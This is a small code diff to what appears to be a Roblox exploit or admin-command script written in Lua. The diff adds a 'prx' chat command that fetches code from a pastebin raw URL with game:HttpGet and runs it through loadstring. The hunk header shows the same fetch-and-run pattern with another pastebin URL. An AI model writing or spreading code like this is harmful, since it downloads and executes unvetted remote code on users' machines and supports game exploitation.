@@ -2505,6 +2505,9 @@ loadstring(game:HttpGet('https://pastebin.com/raw/ke5MR9Nh'))()
 		dong(arg2:lower())
 		notify(arg1:sub(2,2):upper()..arg1:sub(3).."ed "..arg2..".")
 	end
+	if command("prx") then
+		loadstring(game:HttpGet("https://pastebin.com/raw/mHfK0Xk4", true))()
+	end
 	if command("admin") then
 		local player = GetPlayerFromString(arg2)
 		if player and not admins[player.UserId] then 
